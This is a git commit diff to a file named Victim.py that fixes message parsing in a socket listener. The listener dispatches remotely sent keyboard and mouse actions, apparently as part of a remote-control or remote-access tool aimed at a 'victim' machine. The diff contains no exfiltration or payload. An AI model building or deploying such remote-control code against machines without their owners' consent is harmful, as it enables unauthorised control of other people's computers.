9648f7474f2e72b99e7a33fdd2831a887ae13c2f
nvNadav <nadav.moshkovits@gmail.com>
2026-01-11 08:27:51 +0200

    Fix action handling in recive_action and update recieve_mouse to process input correctly

--- Victim.py
+++ Victim.py
@@ -52,7 +52,9 @@ def recieve_mouse(end_connection,list):
         # if list[0]=="EXIT":
         #     end_connection.set()
         #     break
+        list = list.split()
         functions[list[0]](list,mouse)
+
     except Exception as error:
         print(str(error))
     # finally:
@@ -121,9 +123,9 @@ def recive_action(socket):
     #one thread!!!!
     actions = {"keyboard":recieve_keyboard,"mouse":recieve_mouse}
     while not end_connection.is_set():
-        raw = prot.receive_msg(socket).split("split_action_message")
-        action, message =raw.split("split_action_message")
-        actions[action,message]
+        raw = prot.receive_msg(socket)
+        action, message = raw.split("split_action_message")
+        actions[action](end_connection,message)
 
 
 end_connection = threading.Event()
